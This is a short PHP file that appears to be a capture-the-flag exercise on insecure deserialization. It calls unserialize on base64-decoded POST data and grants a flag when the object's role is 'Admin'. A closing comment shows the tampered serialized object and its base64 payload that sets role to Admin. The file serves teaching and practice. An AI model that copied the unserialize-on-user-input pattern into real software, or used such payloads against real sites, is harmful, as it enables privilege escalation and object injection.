<?php 
// Modifying object attribute


class login {
  public $username = "X-C3LL";
  public $password = "Insanity";
  public $role = "MUGGLE";
}
$one = new login();
$a = serialize($one);
echo "Example of an object: $a </br>";
echo "</br> FLAG: n";
if (isset($_POST['data'])){

	$data = base64_decode($_POST['data']);
	$test = unserialize($data);
	$check = $test->role ;
	if ($check == "Admin") {
	  //$flag = file_get_contents("flag.txt");
	  $flag = "ddone";
	  echo $flag;
	} else {
	  echo "</br> No flag for you!! Better luck next time!n </br>";
	}	
}



/*
From this :

O:5:"login":3:{s:8:"username";s:6:"X-C3LL";s:8:"password";s:8:"Insanity";s:4:"role";s:6:"Mugger";}

data=Tzo1OiJsb2dpbiI6Mzp7czo4OiJ1c2VybmFtZSI7czo2OiJYLUMzTEwiO3M6ODoicGFzc3dvcmQiO3M6ODoiSW5zYW5pdHkiO3M6NDoicm9sZSI7czo2OiJNdWdnZXIiO30=

=> Change to 

O:5:"login":3:{s:8:"username";s:6:"X-C3LL";s:8:"password";s:8:"Insanity";s:4:"role";s:5:"Admin";}

data=Tzo1OiJsb2dpbiI6Mzp7czo4OiJ1c2VybmFtZSI7czo2OiJYLUMzTEwiO3M6ODoicGFzc3dvcmQiO3M6ODoiSW5zYW5pdHkiO3M6NDoicm9sZSI7czo1OiJBZG1pbiI7fQ==


*/
?>